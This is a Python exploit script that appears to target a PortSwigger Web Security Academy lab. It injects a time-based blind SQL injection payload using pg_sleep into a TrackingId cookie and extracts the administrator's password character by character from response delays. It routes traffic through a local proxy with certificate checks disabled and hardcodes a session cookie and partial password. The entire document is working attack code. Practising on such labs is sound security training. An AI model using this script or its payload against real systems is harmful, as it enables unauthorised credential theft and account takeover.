import requests
import urllib3
import string
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://0a780032048fe1ce80efd0e400810068.web-security-academy.net/filter?category=Toys+%26+Games'
proxies = {
    'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'
}


def main():
    password = 'owa94cp'
    for i in range(3, 21):
        for j in (string.ascii_lowercase+string.ascii_uppercase+string.digits):

            payload = f"'||(select CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END from users where username='administrator' and SUBSTRING(password,{i},1)='{j}')--"
            cookies = {
                'TrackingId': "WGrCpcZEHL9UIWiT"+payload,
                'session': 'CnSWd0OG5D6WOQD2VVTmw9uYRn2MGOIP'
            }
            r = requests.get(url, cookies=cookies,
                             verify=False, proxies=proxies)
            if int(r.elapsed.total_seconds()) >= 10:
                password += j
                sys.stdout.write('\r'+password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r'+password+j)
                sys.stdout.flush()


if __name__ == '__main__':
    main()
